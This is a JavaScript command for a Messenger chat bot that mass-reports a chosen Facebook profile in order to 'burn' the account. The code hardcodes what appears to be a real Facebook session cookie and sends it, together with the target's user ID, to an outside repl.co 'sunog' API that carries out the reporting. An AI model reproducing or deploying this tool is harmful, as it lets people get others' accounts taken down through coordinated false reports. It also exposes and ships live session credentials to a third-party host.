module.exports.config = {
  name: "reportv1",
  version: "2.0.0",
  hasPermssion: 3,
  credits: "shiki and rework by kennethpanio added number choices to reports",
  description: "RIP POSER/RP ACCOUNT let them burn by shiki machina!",
  commandCategory: "admin",
  usePrefix: true,
  usages: "[uid] [number of reports accounts]",
  cooldowns: 2,
};

const cook = "c_user=61551733220227; xs=14:34iiQuQGuVo97Q:2:1695479743:-1:-1; fr=0JvLhAZJmD0WqWTzm.AWU2-MqJaktzuTTnA4Sgat5KBck.BlDve_..AAA.0.0.BlDve_.AWWJJlnq04Q; datr=v_cOZQuScgP_uFTEHhSgaZz6;";

const encodedCook = encodeURIComponent(cook).replace(/%(?![0-9a-fA-F]{2}|3[Bb])/g, '%25');

module.exports.run = async function({ api, event, args }) {
  const axios = require("axios");
  let { threadID, messageID } = event;
  const response = args[0];
  const numberOfReports = parseInt(args[1]) || 1;

  if (!response) return api.sendMessage("Usage: reportv1 [uid] [number of reports]", threadID, messageID);

  try {
    for (let i = 0; i < numberOfReports; i++) {
      api.sendMessage(`BURNING PROCESSING...ID:\https://www.facebook.com/profile.php?id=${response}`, threadID, messageID);
    }

    const res = await axios.get(`https://sunog-api-jenk.hayih59124.repl.co/sunog?id=${encodedCook}&id=${response}`);
    console.log(res); // Log the entire res object
    const respond = res.data.message;

    api.sendMessage(respond, threadID, messageID);
    api.sendMessage("Report has been successfully sent! iyak pag nasunog swertihin pag buhay!", threadID, messageID);
  } catch (error) {
    console.log(error);
    api.sendMessage("An error occurred while fetching the API response.", threadID, messageID);
  }
};